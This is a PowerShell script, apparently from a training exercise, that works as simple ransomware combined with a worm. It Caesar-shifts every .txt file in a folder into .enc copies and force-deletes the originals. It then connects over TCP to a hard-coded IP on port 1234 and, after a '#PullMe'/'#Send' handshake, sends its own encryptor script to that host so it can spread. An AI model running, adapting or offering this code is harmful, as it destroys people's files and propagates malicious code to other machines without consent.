Write-Host 'Starting the execution'
# Define the folder path and shift value
$folderPath = "$HOME\OneDrive\Desktop\test\enc_folder"
$shift = 25

# Get the list of files in the folder
$files = Get-ChildItem -Path $folderPath

# Determine the path for the encrypted folder
$encryptedFolderPath = Join-Path -Path $folderPath -ChildPath "Encrypted"

# Check if the encrypted folder already exists
if (-not (Test-Path -Path $encryptedFolderPath -PathType Container)) {
    # Create the encrypted folder if it doesn't exist
    New-Item -ItemType Directory -Path $encryptedFolderPath | Out-Null
}

# Encrypt and save each file in the new folder
foreach ($file in $files) {
    if ($file.Extension -eq ".txt") {
        # Read the content of the file
        $content = Get-Content -Path $file.FullName -Raw

        # Convert the content to an array of characters
        $characters = $content.ToCharArray()

        # Encrypt each character in the array
        for ($i = 0; $i -lt $characters.Length; $i++) {
            $char = $characters[$i]

            # Check if the character is a letter
            if ($char -match "[a-zA-Z]") {
                # Determine the ASCII value of the character
                $ascii = [int]$char

                # Encrypt the character using Caesar cipher
                if ($char -cmatch "[a-z]") {
                    $encryptedChar = [char]((($ascii - 97 + $shift) % 26) + 97)
                }
                elseif ($char -cmatch "[A-Z]") {
                    $encryptedChar = [char]((($ascii - 65 + $shift) % 26) + 65)
                }

                # Replace the character in the array with the encrypted character
                $characters[$i] = $encryptedChar
            }
        }

        # Convert the array of characters back to a string
        $encryptedContent = -join $characters

        # Determine the path for the encrypted file
        $encryptedFilePath = Join-Path -Path $encryptedfolderPath -ChildPath ($file.BaseName + ".enc")

        # Save the encrypted content to the encrypted file
        $encryptedContent | Out-File -FilePath $encryptedFilePath -Encoding UTF8

        # Remove the original file if it is a file (not a directory)
        if ($file.PSIsContainer -eq $false) {
            Remove-Item -Path $file.FullName -Force
        }
    }
}

Write-Host "Encryption complete. Original files deleted. Encrypted files saved in: $encryptedFolderPath"

$filePath = "$HOME\OneDrive\Desktop\test\day4\encryptor.ps1"
$ipAddresses = @("192.168.61.78")
$port = 1234

function Test-Connections {
    param (
        [string[]]$ips,
        [int]$port
    )
    foreach ($ip in $ips) {
        Write-Host "Testing connection with $ip on port $port..."
        
        # Create a TCP client and try to connect
        $client = New-Object System.Net.Sockets.TcpClient
        try {
            $client.Connect($ip, $port)
            Write-Host "Connection successful with $ip on port $port. Sending 'PullMe' message."

            # Read the content of the script file
            $content = Get-Content -Path $filePath -Raw

            # Send the "PullMe" message to the remote system
            $pullMeMessage = [System.Text.Encoding]::UTF8.GetBytes("#PullMe")
            $stream = $client.GetStream()
            $stream.Write($pullMeMessage, 0, $pullMeMessage.Length)

            # Convert the script content to bytes
            $scriptBytes = [System.Text.Encoding]::UTF8.GetBytes($content)

            # Wait for the "Send" message from the remote system
            $receiveBuffer = New-Object byte[] 1024
            $receivedData = ""
            $timeout = (Get-Date).AddSeconds(10)
            while ($receivedData -notmatch "#Send" -and (Get-Date) -lt $timeout) {
                $bytesRead = $stream.Read($receiveBuffer, 0, $receiveBuffer.Length)
                $receivedData = [System.Text.Encoding]::UTF8.GetString($receiveBuffer, 0, $bytesRead)
            }

            if ($receivedData -match "#Send") {
                # Send the script content to the remote system
                $stream.Write($scriptBytes, 0, $scriptBytes.Length)
            Write-Host "message 'send' recieved and script sent"
                # Close the TCP client
                $client.Close()
            } else {
                # Timeout reached, terminate the connection
                Write-Host "Timeout reached. No 'Send' message received from $ip on port $port."
                $client.Close()
                continue
            }

        } catch {
            # Connection failed, move to the next IP address
            # Write-Host "Connection failed with $ip on port $port."
            continue
        }
    }
}

# Call the function to test connections
Test-Connections -ips $ipAddresses -port $port